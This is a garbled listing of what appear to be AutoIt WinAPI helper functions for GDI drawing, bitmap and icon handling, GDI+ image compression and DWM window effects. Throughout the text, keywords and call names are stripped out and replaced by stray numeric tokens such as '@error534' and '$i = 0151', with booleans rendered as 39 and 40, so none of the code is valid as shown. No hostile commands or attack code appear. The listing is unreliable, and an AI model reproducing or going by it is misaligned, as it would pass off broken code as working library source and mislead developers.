_winapi_anglearc($hdc, $ix, $iy, $iradius, $nstartangle, $nsweepangle)
$aret = ("gdi32.dll", "bool", "AngleArc", "handle", $hdc, "int", $ix, "int", $iy, "dword", $iradius, "float", $nstartangle, "float", $nsweepangle)
@error534(@error, @extended, 40)
$aret[0]

_winapi_arc($hdc, $trect, $ixstartarc, $iystartarc, $ixendarc, $iyendarc)
$aret = ("gdi32.dll", "bool", "Arc", "handle", $hdc, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4), "int", $ixstartarc, "int", $iystartarc, "int", $ixendarc, "int", $iyendarc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_arcto($hdc, $trect, $ixradial1, $iyradial1, $ixradial2, $iyradial2)
$aret = ("gdi32.dll", "bool", "ArcTo", "handle", $hdc, "int", ($trect, 1), "int", ($trect, 2), "int", ($trect, 3), "int", ($trect, 4), "int", $ixradial1, "int", $iyradial1, "int", $ixradial2, "int", $iyradial2)
@error534(@error, @extended, 40)
$aret[0]

_winapi_beginpaint($hwnd, 36$tpaintstruct)
$tpaintstruct = ($tagpaintstruct)
$aret = ("user32.dll", "handle", "BeginPaint", "hwnd", $hwnd, "struct*", $tpaintstruct)
@error534(@error, @extended, 0)
$aret[0]

_winapi_beginpath($hdc)
$aret = ("gdi32.dll", "bool", "BeginPath", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_closeenhmetafile($hdc)
$aret = ("gdi32.dll", "handle", "CloseEnhMetaFile", "handle", $hdc)
@error534(@error, @extended, 0)
$aret[0]

_winapi_closefigure($hdc)
$aret = ("gdi32.dll", "bool", "CloseFigure", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_coloradjustluma($irgb, $ipercent, $bscale = 39)
$irgb = -1534(10, 0, -1)
$bscale5
$ipercent = ($ipercent * 10)

$aret = ("shlwapi.dll", "dword", "ColorAdjustLuma", "dword", __rgb($irgb), "int", $ipercent, "bool", $bscale)
@error534(@error, @extended, -1)
__rgb($aret[0])

_winapi_colorhlstorgb($ihue, $iluminance, $isaturation)
$isaturation5$ihue = 160
$aret = ("shlwapi.dll", "dword", "ColorHLSToRGB", "word", $ihue, "word", $iluminance, "word", $isaturation)
@error534(@error, @extended, -1)
__rgb($aret[0])

_winapi_colorrgbtohls($irgb, 36$ihue, 36$iluminance, 36$isaturation)
$aret = ("shlwapi.dll", "none", "ColorRGBToHLS", "dword", __rgb($irgb), "word*", 0, "word*", 0, "word*", 0)
@error534(@error, @extended, 0)
$ihue = $aret[2]
$iluminance = $aret[3]
$isaturation = $aret[4]


_winapi_combinetransform($txform1, $txform2)
$txform = ($tagxform)
$aret = ("gdi32.dll", "bool", "CombineTransform", "struct*", $txform, "struct*", $txform1, "struct*", $txform2)
@error23$aret[0]534(@error + 10, @extended, 0)
$txform

_winapi_compressbitmapbits($hbitmap, 36$pbuffer, $icompression = 0, $iquality = 100)
__dll("gdiplus.dll")534(103, 0, 0)
$asize[2], $icount, $iformat, $ilength, $smime, $aret, $hdc, $hsv, $hmem, $tbits, $tinfo, $tdata, $pdata, $ierror = 1
$hsource = 0, $himage = 0, $htoken = 0, $pencoder = 0, $pstream = 0, $tparam = 0
$tdib = ($tagdibsection)

$icompression

$smime = "image/png"

$smime = "image/jpeg"

$ierror = 10


$hbitmap
_winapi_getobject($hbitmap, ($tdib), ($tdib))5
$ierror = 11


(($tdib, "bmBitsPixel") = 32)(($tdib, "biCompression"))5
$ierror = 12


$hsource5
$ierror = 13


$hsource = _winapi_createdib(($tdib, "bmWidth"), ($tdib, "bmHeight"))
$hsource5
$ierror = @error + 100


$hdc = _winapi_createcompatibledc(0)
$hsv = _winapi_selectobject($hdc, $hsource)
_winapi_drawbitmap($hdc, 0, 0, $hbitmap)5
$hbitmap = $hsource

$ierror = @error + 200
$hbitmap = 0

_winapi_selectobject($hdc, $hsv)
_winapi_deletedc($hdc)

$hbitmap5


$i = 0151
$asize[$i] = ($tdib, $i + 2)

$tbits = ("byte[" & ($asize[0] * $asize[1] * 4) & "]")
_winapi_getbitmapbits($hbitmap, ($tbits), ($tbits))5
$ierror = @error + 300


$tdata = ($taggdipstartupinput)
($tdata, "Version", 1)
$aret = ("gdiplus.dll", "int", "GdiplusStartup", "ulong_ptr*", 0, "struct*", $tdata, "ptr", 0)
@error2$aret[0]5
$ierror = @error + 400


_winapi_isalphabitmap($hbitmap)5
$iformat = 2498570

$iformat = 139273

$htoken = $aret[1]
$aret = ("gdiplus.dll", "int", "GdipCreateBitmapFromScan0", "int", $asize[0], "int", $asize[1], "uint", $asize[0] * 4, "int", $iformat, "struct*", $tbits, "ptr*", 0)
@error2$aret[0]5
$ierror = @error + 500


$himage = $aret[6]
$aret = ("gdiplus.dll", "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
@error2$aret[0]5
$ierror = @error + 600


$icount = $aret[1]
$tdata = ("byte[" & $aret[2] & "]")
@error5
$ierror = @error + 700


$pdata = ($tdata)
$aret = ("gdiplus.dll", "int", "GdipGetImageEncoders", "uint", $icount, "uint", $aret[2], "ptr", $pdata)
@error2$aret[0]5
$ierror = @error + 800


0$tagimagecodecinfo = "byte[16] Clsid;byte[16] FormatID;ptr szCodecName;ptr szDllName;ptr szFormatDescription;ptr szFilenameExtension;ptr szMimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr pbSigPattern;ptr pbSigMask"
$i = 115$icount
$tinfo = ($tagimagecodecinfo, $pdata)
(_winapi_widechartomultibyte(($tinfo, "szMimeType")), $smime)5
$pdata += ($tinfo)

$pencoder = $pdata
$ierror = 14



$pencoder5
$ierror = 15


$icompression


0$tagencoderparameter = "byte[16] GUID;ulong NumberOfValues;dword Type;ptr pValue"
$tparam = ("dword Count;" & $tagencoderparameter & ";ulong Quality")
($tparam, "Count", 1)
($tparam, "NumberOfValues", 1)
($tparam, "Type", 4)
($tparam, "pValue", ($tparam, "Quality"))
($tparam, "Quality", $iquality)
$aret = ("ole32.dll", "long", "CLSIDFromString", "wstr", "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}", "ptr", ($tparam, 2))
@error2$aret[0]5
$tparam = 0


$pstream = _winapi_createstreamonhglobal()
$aret = ("gdiplus.dll", "int", "GdipSaveImageToStream", "ptr", $himage, "ptr", $pstream, "ptr", $pencoder, "struct*", $tparam)
@error2$aret[0]5
$ierror = @error + 900


$hmem = _winapi_gethglobalfromstream($pstream)
$aret = ("kernel32.dll", "ulong_ptr", "GlobalSize", "handle", $hmem)
@error23$aret[0]5
$ierror = @error + 1000


$ilength = $aret[0]
$aret = ("kernel32.dll", "ptr", "GlobalLock", "handle", $hmem)
@error23$aret[0]5
$ierror = @error + 1100


$pbuffer = __heaprealloc($pbuffer, $ilength, 1)
@error5
_winapi_movememory($pbuffer, $aret[0], $ilength)

$ierror = @error + 1300


$pstream5
_winapi_releasestream($pstream)

$himage5
("gdiplus.dll", "int", "GdipDisposeImage", "handle", $himage)

$htoken5
("gdiplus.dll", "none", "GdiplusShutdown", "ulong_ptr", $htoken)

$hsource5
_winapi_deleteobject($hsource)

$ierror534($ierror, 0, 0)
$ilength

_winapi_copybitmap($hbitmap)
$hbitmap = _winapi_copyimage($hbitmap, 0, 0, 0, 8192)
(@error, @extended, $hbitmap)

_winapi_copyenhmetafile($hemf, $sfile = "")
$stypeoffile = "wstr"
($sfile, $str_stripleading + $str_striptrailing)5
$stypeoffile = "ptr"
$sfile = 0

$aret = ("gdi32.dll", "handle", "CopyEnhMetaFileW", "handle", $hemf, $stypeoffile, $sfile)
@error534(@error, @extended, 0)
$aret[0]

_winapi_copyimage($himage, $itype = 0, $idesiredx = 0, $idesiredy = 0, $iflags = 0)
$aret = ("user32.dll", "handle", "CopyImage", "handle", $himage, "uint", $itype, "int", $idesiredx, "int", $idesiredy, "uint", $iflags)
@error534(@error, @extended, 0)
$aret[0]

_winapi_copyrect($trect)
$tdata = ($tagrect)
$aret = ("user32.dll", "bool", "CopyRect", "struct*", $tdata, "struct*", $trect)
@error23$aret[0]5(@error + 10, @extended, 0)
$tdata

_winapi_create32bithbitmap($hicon, $bdib = 40, $bdelete = 40)
$hbitmap = 0
$adib[2] = [0, 0]
$htemp = _winapi_create32bithicon($hicon)
@error534(@error, @extended, 0)
$ierror = 0

$ticoninfo = ($tagiconinfo)
$aret = ("user32.dll", "bool", "GetIconInfo", "handle", $htemp, "struct*", $ticoninfo)
@error23$aret[0]5
$ierror = @error + 10


$i = 0151
$adib[$i] = ($ticoninfo, $i + 4)

$tbitmap = ($tagbitmap)
_winapi_getobject($adib[0], ($tbitmap), ($tbitmap))5
$ierror = @error + 20


$bdib5
$hbitmap = _winapi_createdib(($tbitmap, "bmWidth"), ($tbitmap, "bmHeight"))
$hdc = _winapi_createcompatibledc(0)
$hsv = _winapi_selectobject($hdc, $hbitmap)
_winapi_drawiconex($hdc, 0, 0, $htemp)
_winapi_selectobject($hdc, $hsv)
_winapi_deletedc($hdc)

$hbitmap = $adib[1]
$adib[1] = 0


$i = 0151
$adib[$i]5
_winapi_deleteobject($adib[$i])


_winapi_destroyicon($htemp)
$ierror534($ierror, 0, 0)
$hbitmap534(12, 0, 0)
$bdelete5
_winapi_destroyicon($hicon)

$hbitmap

_winapi_create32bithicon($hicon, $bdelete = 40)
$ahbitmap[2], $hresult = 0
$adib[2][2] = [[0, 0], [0, 0]]
$ticoninfo = ($tagiconinfo)
$aret = ("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
@error534(@error, @extended, 0)
$aret[0]534(10, 0, 0)
$i = 0151
$ahbitmap[$i] = ($ticoninfo, $i + 4)

_winapi_isalphabitmap($ahbitmap[1])5
$adib[0][0] = _winapi_createandbitmap($ahbitmap[1])
@error5
$hresult = _winapi_createiconindirect($ahbitmap[1], $adib[0][0])


$tsize = _winapi_getbitmapdimension($ahbitmap[1])
$asize[2]
$i = 0151
$asize[$i] = ($tsize, $i + 1)

$hsrcdc = _winapi_createcompatibledc(0)
$hdstdc = _winapi_createcompatibledc(0)
$hsrcsv, $hdstsv
$i = 0151
$adib[$i][0] = _winapi_createdib($asize[0], $asize[1])
$adib[$i][1] = $__g_vext
$hsrcsv = _winapi_selectobject($hsrcdc, $ahbitmap[$i])
$hdstsv = _winapi_selectobject($hdstdc, $adib[$i][0])
_winapi_bitblt($hdstdc, 0, 0, $asize[0], $asize[1], $hsrcdc, 0, 0, 12583114)
_winapi_selectobject($hsrcdc, $hsrcsv)
_winapi_selectobject($hdstdc, $hdstsv)

_winapi_deletedc($hsrcdc)
_winapi_deletedc($hdstdc)
$aret = ("user32.dll", "lresult", "CallWindowProc", "ptr", __xorproc(), "ptr", 0, "uint", $asize[0] * $asize[1] * 4, "wparam", $adib[0][1], "lparam", $adib[1][1])
@error1$aret[0]5
$hresult = _winapi_createiconindirect($adib[1][0], $ahbitmap[0])


$i = 0151
_winapi_deleteobject($ahbitmap[$i])
$adib[$i][0]5
_winapi_deleteobject($adib[$i][0])


$hresult534(11, 0, 0)
$bdelete5
_winapi_destroyicon($hicon)

$hresult

_winapi_createandbitmap($hbitmap)
$ierror = 0, $hdib = 0
$hbitmap = _winapi_copybitmap($hbitmap)
$hbitmap534(@error + 20, @extended, 0)

$atdib[2]
$atdib[0] = ($tagdibsection)
(3_winapi_getobject($hbitmap, ($atdib[0]), ($atdib[0])))(($atdib[0], "bmBitsPixel") <> 32)(($atdib[0], "biCompression"))5
$ierror = 10


$atdib[1] = ($tagbitmap)
$hdib = _winapi_createdib(($atdib[0], "bmWidth"), ($atdib[0], "bmHeight"), 1)
_winapi_getobject($hdib, ($atdib[1]), ($atdib[1]))5
$ierror = 11


$aret = ("user32.dll", "lresult", "CallWindowProc", "ptr", __andproc(), "ptr", 0, "uint", 0, "wparam", ($atdib[0]), "lparam", ($atdib[1]))
@error5
$ierror = @error


$aret[0]5
$ierror = 12


$ierror = 0

_winapi_deleteobject($hbitmap)
$ierror5
$hdib5
_winapi_deleteobject($hdib)

$hdib = 0

($ierror, 0, $hdib)

_winapi_createbitmapindirect(36$tbitmap)
$aret = ("gdi32.dll", "handle", "CreateBitmapIndirect", "struct*", $tbitmap)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createbrushindirect($istyle, $irgb, $ihatch = 0)
$tlogbrush = ($taglogbrush)
($tlogbrush, 1, $istyle)
($tlogbrush, 2, __rgb($irgb))
($tlogbrush, 3, $ihatch)
$aret = ("gdi32.dll", "handle", "CreateBrushIndirect", "struct*", $tlogbrush)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createcoloradjustment($iflags = 0, $iilluminant = 0, $igammar = 10000, $igammag = 10000, $igammab = 10000, $iblack = 0, $iwhite = 10000, $icontrast = 0, $ibrightness = 0, $icolorfulness = 0, $itint = 0)
$tca = ($tagcoloradjustment)
($tca, 1, ($tca))
($tca, 2, $iflags)
($tca, 3, $iilluminant)
($tca, 4, $igammar)
($tca, 5, $igammag)
($tca, 6, $igammab)
($tca, 7, $iblack)
($tca, 8, $iwhite)
($tca, 9, $icontrast)
($tca, 10, $ibrightness)
($tca, 11, $icolorfulness)
($tca, 12, $itint)
$tca

_winapi_createcompatiblebitmapex($hdc, $iwidth, $iheight, $irgb)
$hbrush = _winapi_createbrushindirect(0, $irgb)
$aret = ("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
$hdestdc = $aret[0]
$aret = ("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
$hbmp = $aret[0]
$aret = ("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hbmp)
$hdestsv = $aret[0]
$trect = _winapi_createrectex(0, 0, $iwidth, $iheight)
$ierror = 0
$aret = ("user32.dll", "int", "FillRect", "handle", $hdestdc, "struct*", $trect, "handle", $hbrush)
@error23$aret[0]5
$ierror = @error + 10
_winapi_deleteobject($hbmp)

_winapi_deleteobject($hbrush)
("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hdestsv)
("gdi32.dll", "bool", "DeleteDC", "handle", $hdestdc)
$ierror534($ierror, 0, 0)
$hbmp

_winapi_createdib($iwidth, $iheight, $ibitsperpel = 32, $tcolortable = 0, $icolorcount = 0)
$argbq[2], $icolors, $tagrgbq
$ibitsperpel

$icolors = 2

$icolors = 16

$icolors = 256

$icolors = 0

$icolors5
($tcolortable)5
$ibitsperpel

$argbq[0] = 0
$argbq[1] = 16777215
$tcolortable = _winapi_createdibcolortable($argbq)



$icolors > $icolorcount5
$icolors = $icolorcount

(3$icolors)((4 * $icolors) > ($tcolortable))5
(20, 0, 0)


$tagrgbq = ";dword aRGBQuad[" & $icolors & "]"

$tagrgbq = ""

$tbitmapinfo = ($tagbitmapinfoheader & $tagrgbq)
($tbitmapinfo, "biSize", 40)
($tbitmapinfo, "biWidth", $iwidth)
($tbitmapinfo, "biHeight", $iheight)
($tbitmapinfo, "biPlanes", 1)
($tbitmapinfo, "biBitCount", $ibitsperpel)
($tbitmapinfo, "biCompression", 0)
($tbitmapinfo, "biSizeImage", 0)
($tbitmapinfo, "biXPelsPerMeter", 0)
($tbitmapinfo, "biYPelsPerMeter", 0)
($tbitmapinfo, "biClrUsed", $icolors)
($tbitmapinfo, "biClrImportant", 0)
$icolors5
($tcolortable)5
_winapi_movememory(($tbitmapinfo, "aRGBQuad"), ($tcolortable), 4 * $icolors)

_winapi_zeromemory(($tbitmapinfo, "aRGBQuad"), 4 * $icolors)


$hbitmap = _winapi_createdibsection(0, $tbitmapinfo, 0, $__g_vext)
$hbitmap534(@error, @extended, 0)
$hbitmap

_winapi_createdibcolortable(3036$acolortable, $istart = 0, $iend = -1)
__checkerrorarraybounds($acolortable, $istart, $iend)534(@error + 10, @extended, 0)
$tcolortable = ("dword[" & ($iend - $istart + 1) & "]")
$icount = 1
$i = $istart15$iend
($tcolortable, 1, _winapi_switchcolor(__rgb($acolortable[$i])), $icount)
$icount += 1

$tcolortable

_winapi_createdibitmap($hdc, 36$tbitmapinfo, $iusage, $pbits = 0)
$iinit = 0
$pbits5
$iinit = 4

$aret = ("gdi32.dll", "handle", "CreateDIBitmap", "handle", $hdc, "struct*", $tbitmapinfo, "dword", $iinit, "ptr", $pbits, "struct*", $tbitmapinfo, "uint", $iusage)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createdibsection($hdc, $tbitmapinfo, $iusage, 36$pbits, $hsection = 0, $ioffset = 0)
$pbits = 0
$aret = ("gdi32.dll", "handle", "CreateDIBSection", "handle", $hdc, "struct*", $tbitmapinfo, "uint", $iusage, "ptr*", 0, "handle", $hsection, "dword", $ioffset)
@error23$aret[0]534(@error, @extended, 0)
$pbits = $aret[4]
$aret[0]

_winapi_createellipticrgn($trect)
$aret = ("gdi32.dll", "handle", "CreateEllipticRgnIndirect", "struct*", $trect)
@error534(@error, @extended, 40)
$aret[0]

_winapi_createemptyicon($iwidth, $iheight, $ibitsperpel = 32)
$hxor = _winapi_createdib($iwidth, $iheight, $ibitsperpel)
$hand = _winapi_createdib($iwidth, $iheight, 1)
$hdc = _winapi_createcompatibledc(0)
$hsv = _winapi_selectobject($hdc, $hand)
$hbrush = _winapi_createsolidbrush(16777215)
$trect = _winapi_createrect(0, 0, $iwidth, $iheight)
_winapi_fillrect($hdc, ($trect), $hbrush)
_winapi_deleteobject($hbrush)
_winapi_selectobject($hdc, $hsv)
_winapi_deletedc($hdc)
$hicon = _winapi_createiconindirect($hxor, $hand)
$ierror = @error
$hxor5
_winapi_deleteobject($hxor)

$hand5
_winapi_deleteobject($hand)

$hicon534($ierror + 10, 0, 0)
$hicon

_winapi_createenhmetafile($hdc = 0, $trect = 0, $bpixels = 40, $sfile = "", $sdescription = "")
$stypeoffile = "wstr"
($sfile, $str_stripleading + $str_striptrailing)5
$stypeoffile = "ptr"
$sfile = 0

$tdata = 0, $adata = ($sdescription, "|", $str_nocount)
($adata) < 25
$adata[2]
$adata[1] = ""

$i = 0151
$adata[$i] = ($adata[$i], $str_stripleading + $str_striptrailing)

($adata[0])($adata[1])5
$tdata = _winapi_arraytostruct($adata)

$ixp, $iyp, $ixm, $iym, $href = 0
$bpixels(($trect))5
$hdc5
$href = _winapi_getdc(0)

$ixp = _winapi_getdevicecaps($href, 8)
$iyp = _winapi_getdevicecaps($href, 10)
$ixm = _winapi_getdevicecaps($href, 4)
$iym = _winapi_getdevicecaps($href, 6)
$href5
_winapi_releasedc(0, $href)

$i = 1153162
($trect, $i, (($trect, $i) * $ixm / $ixp * 100))

$i = 2154162
($trect, $i, (($trect, $i) * $iym / $iyp * 100))


$aret = ("gdi32.dll", "handle", "CreateEnhMetaFileW", "handle", $hdc, $stypeoffile, $sfile, "struct*", $trect, "struct*", $tdata)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createfontex($iheight, $iwidth = 0, $iescapement = 0, $iorientation = 0, $iweight = 400, $bitalic = 40, $bunderline = 40, $bstrikeout = 40, $icharset = 1, $ioutprecision = 0, $iclipprecision = 0, $iquality = 0, $ipitchandfamily = 0, $sfacename = "", $istyle = 0)
$aret = ("gdi32.dll", "handle", "CreateFontW", "int", $iheight, "int", $iwidth, "int", $iescapement, "int", $iorientation, "int", $iweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $icharset, "dword", $ioutprecision, "dword", $iclipprecision, "dword", $iquality, "dword", $ipitchandfamily, "wstr", _winapi_getfontname($sfacename, $istyle, $icharset))
@error534(@error, @extended, 0)
$aret[0]

_winapi_createiconindirect($hbitmap, $hmask, $ixhotspot = 0, $iyhotspot = 0, $bicon = 39)
$ticoninfo = ($tagiconinfo)
($ticoninfo, 1, $bicon)
($ticoninfo, 2, $ixhotspot)
($ticoninfo, 3, $iyhotspot)
($ticoninfo, 4, $hmask)
($ticoninfo, 5, $hbitmap)
$aret = ("user32.dll", "handle", "CreateIconIndirect", "struct*", $ticoninfo)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createnullrgn()
$aret = ("gdi32.dll", "handle", "CreateRectRgn", "int", 0, "int", 0, "int", 0, "int", 0)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createpolygonrgn(3036$apoint, $istart = 0, $iend = -1, $imode = 1)
__checkerrorarraybounds($apoint, $istart, $iend, 2, 2)534(@error + 10, @extended, 0)
$tagstruct = ""
$i = $istart15$iend
$tagstruct &= "int[2];"

$tdata = ($tagstruct)
$icount = 1
$i = $istart15$iend
$j = 0151
($tdata, $icount, $apoint[$i][$j], $j + 1)

$icount += 1

$aret = ("gdi32.dll", "handle", "CreatePolygonRgn", "struct*", $tdata, "int", $icount - 1, "int", $imode)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createrectrgnindirect($trect)
$aret = ("gdi32.dll", "handle", "CreateRectRgnIndirect", "struct*", $trect)
@error534(@error, @extended, 0)
$aret[0]

_winapi_createtransform($nm11 = 1, $nm12 = 0, $nm21 = 0, $nm22 = 1, $ndx = 0, $ndy = 0)
$txform = ($tagxform)
($txform, 1, $nm11)
($txform, 2, $nm12)
($txform, 3, $nm21)
($txform, 4, $nm22)
($txform, 5, $ndx)
($txform, 6, $ndy)
$txform

_winapi_deleteenhmetafile($hemf)
$aret = ("gdi32.dll", "bool", "DeleteEnhMetaFile", "ptr", $hemf)
@error534(@error, @extended, 40)
$aret[0]

_winapi_dptolp($hdc, 36$tpoint, $icount = 1)
$aret = ("gdi32.dll", "bool", "DPtoLP", "handle", $hdc, "struct*", $tpoint, "int", $icount)
@error534(@error, @extended, 40)
$aret[0]

_winapi_drawanimatedrects($hwnd, $trectfrom, $trectto)
$aret = ("user32.dll", "bool", "DrawAnimatedRects", "hwnd", $hwnd, "int", 3, "struct*", $trectfrom, "struct*", $trectto)
@error534(@error, @extended, 0)
$aret[0]

_winapi_drawbitmap($hdc, $ix, $iy, $hbitmap, $irop = 13369376)
$tobj = ($tagbitmap)
$aret = ("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", ($tobj), "struct*", $tobj)
@error23$aret[0]534(@error + 20, @extended, 0)
$aret = ("user32.dll", "handle", "GetDC", "hwnd", 0)
$_hdc = $aret[0]
$aret = ("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $_hdc)
$hsrcdc = $aret[0]
$aret = ("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hbitmap)
$hsrcsv = $aret[0]
$ierror = 0
$aret = ("gdi32.dll", "int", "BitBlt", "hwnd", $hdc, "int", $ix, "int", $iy, "int", ($tobj, "bmWidth"), "int", ($tobj, "bmHeight"), "hwnd", $hsrcdc, "int", 0, "int", 0, "int", $irop)
@error23$aret[0]5
$ierror = @error + 1

("user32.dll", "int", "ReleaseDC", "hwnd", 0, "handle", $_hdc)
("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hsrcsv)
("gdi32.dll", "bool", "DeleteDC", "handle", $hsrcdc)
$ierror534(10, 0, 0)


_winapi_drawfocusrect($hdc, $trect)
$aret = ("user32.dll", "bool", "DrawFocusRect", "handle", $hdc, "struct*", $trect)
@error534(@error, @extended, 0)
$aret[0]

_winapi_drawshadowtext($hdc, $stext, $irgbtext, $irgbshadow, $ixoffset = 0, $iyoffset = 0, $trect = 0, $iflags = 0)
$aret
($trect)5
$trect = ($tagrect)
$aret = ("user32.dll", "bool", "GetClientRect", "hwnd", _winapi_windowfromdc($hdc), "struct*", $trect)
@error534(@error + 10, @extended, 0)
$aret[0]534(10, 0, 0)

$aret = ("comctl32.dll", "int", "DrawShadowText", "handle", $hdc, "wstr", $stext, "uint", -1, "struct*", $trect, "dword", $iflags, "int", __rgb($irgbtext), "int", __rgb($irgbshadow), "int", $ixoffset, "int", $iyoffset)
@error534(@error, @extended, 0)
$aret[0]

_winapi_dwmdefwindowproc($hwnd, $imsg, $wparam, $lparam)
$aret = ("dwmapi.dll", "bool", "DwmDefWindowProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam, "lresult*", 0)
@error23$aret[0]534(@error + 10, @extended, 0)
$aret[5]

_winapi_dwmenableblurbehindwindow($hwnd, $benable = 39, $btransition = 40, $hrgn = 0)
$tblurbehind = ("dword;bool;handle;bool")
$iflags = 0
$hrgn5
$iflags += 2
($tblurbehind, 3, $hrgn)

($tblurbehind, 1, ($iflags, 5))
($tblurbehind, 2, $benable)
($tblurbehind, 4, $btransition)
$aret = ("dwmapi.dll", "long", "DwmEnableBlurBehindWindow", "hwnd", $hwnd, "struct*", $tblurbehind)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmenablecomposition($benable)
$benable5$benable = 1
$aret = ("dwmapi.dll", "long", "DwmEnableComposition", "uint", $benable)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmextendframeintoclientarea($hwnd, $tmargins = 0)
($tmargins)5
$tmargins = _winapi_createmargins(-1, -1, -1, -1)

$aret = ("dwmapi.dll", "long", "DwmExtendFrameIntoClientArea", "hwnd", $hwnd, "ptr", ($tmargins))
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmgetcolorizationcolor()
$aret = ("dwmapi.dll", "long", "DwmGetColorizationColor", "dword*", 0, "bool*", 0)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)
($aret[2], $aret[1])

_winapi_dwmgetcolorizationparameters()
$tdwmcp = ($tagdwm_colorization_parameters)
$aret = ("dwmapi.dll", "uint", 127, "ptr", ($tdwmcp))
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)
$tdwmcp

_winapi_dwmgetwindowattribute($hwnd, $iattribute)
$tagstruct
$iattribute
, 9
$tagstruct = $tagrect

$tagstruct = "uint"

(11, 0, 0)

$tdata = ($tagstruct)
$aret = ("dwmapi.dll", "long", "DwmGetWindowAttribute", "hwnd", $hwnd, "dword", $iattribute, "struct*", $tdata, "dword", ($tdata))
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)
$iattribute

($tdata, 1)

$tdata


_winapi_dwminvalidateiconicbitmaps($hwnd)
$aret = ("dwmapi.dll", "long", "DwmInvalidateIconicBitmaps", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmiscompositionenabled()
$aret = ("dwmapi.dll", "long", "DwmIsCompositionEnabled", "bool*", 0)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)
$aret[1]

_winapi_dwmquerythumbnailsourcesize($hthumbnail)
$tsize = ($tagsize)
$aret = ("dwmapi.dll", "long", "DwmQueryThumbnailSourceSize", "handle", $hthumbnail, "struct*", $tsize)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)
$tsize

_winapi_dwmregisterthumbnail($hdestination, $hsource)
$aret = ("dwmapi.dll", "long", "DwmRegisterThumbnail", "hwnd", $hdestination, "hwnd", $hsource, "handle*", 0)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)
$aret[3]

_winapi_dwmsetcolorizationparameters($tdwmcp)
$aret = ("dwmapi.dll", "uint", 131, "ptr", ($tdwmcp), "uint", 0)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmseticoniclivepreviewbitmap($hwnd, $hbitmap, $bframe = 40, $tclient = 0)
$iflags
$bframe5
$iflags = 1

$iflags = 0

$aret = ("dwmapi.dll", "uint", "DwmSetIconicLivePreviewBitmap", "hwnd", $hwnd, "handle", $hbitmap, "struct*", $tclient, "dword", $iflags)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmseticonicthumbnail($hwnd, $hbitmap, $bframe = 40)
$iflags
$bframe5
$iflags = 1

$iflags = 0

$aret = ("dwmapi.dll", "long", "DwmSetIconicThumbnail", "hwnd", $hwnd, "handle", $hbitmap, "dword", $iflags)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmsetwindowattribute($hwnd, $iattribute, $idata)
$iattribute
, 3, 4, 6, 7, 8, 10, 11, 12

(1, 0, 0)

$aret = ("dwmapi.dll", "long", "DwmSetWindowAttribute", "hwnd", $hwnd, "dword", $iattribute, "dword*", $idata, "dword", 4)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmunregisterthumbnail($hthumbnail)
$aret = ("dwmapi.dll", "long", "DwmUnregisterThumbnail", "handle", $hthumbnail)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_dwmupdatethumbnailproperties($hthumbnail, $bvisible = 39, $bclientareaonly = 40, $iopacity = 255, $trectdest = 0, $trectsrc = 0)
0$tagdwm_thumbnail_properties = "struct;dword dwFlags;int rcDestination[4];int rcSource[4];byte opacity;bool opacity;bool fSourceClientAreaOnly;endstruct"
$tthumbnailproperties = ($tagdwm_thumbnail_properties)
$tsize, $iflags = 0
($trectdest)5
$tsize = _winapi_dwmquerythumbnailsourcesize($hthumbnail)
@error5
(@error + 10, @extended, 0)

$trectdest = _winapi_createrectex(0, 0, ($tsize, 1), ($tsize, 2))

$i = 1154
($tthumbnailproperties, 2, ($trectdest, $i), $i)

($trectsrc)5
$iflags += 2
$i = 1154
($tthumbnailproperties, 3, ($trectsrc, $i), $i)


($tthumbnailproperties, 1, ($iflags, 29))
($tthumbnailproperties, 4, $iopacity)
($tthumbnailproperties, 5, $bvisible)
($tthumbnailproperties, 6, $bclientareaonly)
$aret = ("dwmapi.dll", "long", "DwmUpdateThumbnailProperties", "handle", $hthumbnail, "struct*", $tthumbnailproperties)
@error534(@error, @extended, 0)
$aret[0]534(10, $aret[0], 0)


_winapi_ellipse($hdc, $trect)
